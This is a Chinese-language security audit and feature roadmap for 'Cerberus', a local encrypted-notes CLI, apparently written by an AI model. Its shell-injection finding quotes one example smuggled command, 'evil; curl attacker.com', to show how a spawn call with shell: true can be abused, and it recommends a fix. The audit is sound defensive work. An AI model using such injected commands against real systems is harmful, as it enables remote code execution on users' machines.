# Cerberus — Roadmap & Audit

_安全审计报告 + 功能路线图_

---

## 一、安全审计发现

### 🔴 S1 — `edit.ts` shell 注入风险（中风险）

**位置**: `src/commands/edit.ts`, `runEditor()`

```ts
const child = spawn(editor, [filePath], { stdio: "inherit", shell: true });
```

`shell: true` 使 `$EDITOR`/`$VISUAL` 的值经过 shell 展开。若环境变量被注入恶意命令（如 `evil; curl attacker.com`），会在用户系统上执行。

**修复**: 改为 `shell: false`。`spawn` 本身可接收可执行文件路径，不需要 shell。

### 🟡 S2 — 编辑时明文落盘到 `/tmp`（已知妥协）

**位置**: `src/commands/edit.ts`, ~L69

编辑时必须解密为明文写入临时文件，这是不可避免的。macOS 的 `/tmp` 即 `/private/tmp`，代码已使用 `mkdtemp` + `mode: 0o600` 做最小化防护。

**状态**: 已接受风险。在威胁模型中注明此行为即可。

### 🟢 S3 — `age` 命令的 stderr 被丢弃（低风险）

**位置**: `src/crypto/age.ts`, `runProcess()`

`age` 子进程失败时，stderr 内容未附加到错误信息中，调试时难以定位原因（文件不存在、key 格式错误等）。

**建议**: 错误提示中附加 stderr 前 200 字符（注意不包含用户输入内容）。

### 🟢 S4 — 手动参数解析不支持 `--` 分隔符（低风险）

所有命令使用手写 for-loop 解析 `--flag`，不支持 `--` 结束选项。若标题恰好为 `--category`，解析器会混乱。

**建议**: 后续迁移至 `node:util` 的 `parseArgs`（Node 20+ 内置）或 `mri`。

### ℹ️ S5 — `delete.ts` 中 `identityPlain.fill(0)` 时机（代码可读性）

delete 命令拿到 session 后立刻零化了 `identityPlain`——这是对的（delete 不需要加解密），但缺少注释容易让后续维护者困惑。

**建议**: 添加一行注释说明。

---

## 二、代码质量观察

### 架构

- 分层清晰：CLI → Commands → Services → Storage / Crypto → Core types
- 单元测试 + 集成测试覆盖良好
- 类型安全：strict mode，row 映射统一，无 `any` 滥用

### 可优化项

| 项 | 说明 |
|---|---|
| `search-service.ts` 冗余 | 仅对 `storage/entries.ts` 做 re-export，无额外逻辑，可移除 |
| Skill 层缺少 delete / edit / attach | `openclaw.ts` 只有 new / list / show / search 的 intent handler |
| `list` / `search` 不检查 session | 设计正确（仅查元数据），建议添加注释说明意图 |

---

## 三、功能路线图

### 优先级 1 — 高价值 / 低复杂度

#### 1.1 备份与恢复

```bash
cerberus backup create   # 加密备份到指定路径
cerberus backup verify   # 验证备份完整性
cerberus backup restore  # 从备份恢复
```

- 备份内容：加密条目文件 + 加密附件 + SQLite 元数据 dump
- 备份包本身也应为加密格式（如 `.tar.enc`）
- 恢复时需验证主密码与备份完整性（checksum）

#### 1.2 批量导出

```bash
cerberus export --all              # 导出所有条目明文
cerberus export --category diary   # 导出指定分类
cerberus export --format json      # 输出格式：markdown / json
```

- 导出前二次确认主密码
- 临时输出到指定目录，完成后提示清理

#### 1.3 时间线视图

```bash
cerberus timeline --from 2026-01 --to 2026-03
cerberus today
```

- 日记场景下的核心需求
- 按日期分组展示条目元数据

### 优先级 2 — 高价值 / 中复杂度

#### 2.1 语义搜索

当前仅支持标题和标签的 SQL LIKE 匹配。升级方向：

- 输入主密码后批量解密，构建本地向量索引
- 使用本地 embedding 模型（如 MLX）生成向量
- 搜索时不依赖主密码，仅查询向量索引
- 索引本身不保存原文或原文片段

#### 2.2 TUI 终端界面

比 Web UI 更适合本地优先定位：

- 浏览条目列表、分类筛选
- 即时查看 / 编辑条目正文
- 自然语言搜索框
- 加解密逻辑仍走底层 CLI，TUI 只做展示与交互

可用 `ink`（React TUI）或 `blessed-contrib` 实现。

#### 2.3 Multi-vault 模式

```bash
cerberus --vault ~/.cerberus-work/ init
cerberus --vault ~/.cerberus-legacy/ show <id>
```

- 不同场景独立金库，独立主密码
- 默认仍为 `~/.cerberus/`，flag 覆盖

### 优先级 3 — 中价值 / 高复杂度

#### 3.1 Shamir 密钥分片 + 遗产传承

Cerberus 最有差异化的功能：

- 将 age identity 用 Shamir's Secret Sharing 分成 N/M 份
- 分片分发给可信联系人
- 设定 M-of-N 恢复规则
- 时间锁：某时间点后才可发起恢复请求

**技术要点**:
- 密钥分片库可选 [`shamir-secret-sharing`](https://www.npmjs.com/package/shamir-secret-sharing) 或自封装
- 分片可编码为 QR 码方便打印分发
- 时间锁基于密码学承诺（时间哈希链或类似机制），不依赖外部服务

### 优先级 4 — 探索性

| 功能 | 说明 |
|---|---|
| 双向链接 | 正文中支持 `[[entry-id]]` 引用，类似 Obsidian |
| 审计日志 | 记录操作时间与类型（不记录内容），`cerberus audit` |
| 密码强度评估 | 初始化时用 zxcvbn 分析主密码强度，弱密码提示但不阻止 |
| OpenClaw Skill 深度化 | 对话式回顾（"上周记了什么？"）、自动分类、自然语言搜索 |

---

## 提示

- 备份功能优先于语义搜索——没有备份就丢了，再强的搜索也无意义
- `shell: true` 是实际可被利用的注入点，应优先修复
- Shamir 分片是产品差异化核心，但复杂度较高，建议单独作为一个 milestone，不与其他功能并行
- 所有涉及"导出明文"的操作，UI 层面都需要二次确认 + 主密码验证
- 本文档列出的命令语法为建议，实际实现时可根据 UX 优化调整

---

_审计与规划完成。模型：Qwen3.6-plus-preview (OpenRouter free) ｜ 时间：2026-03-31 15:33 CST_
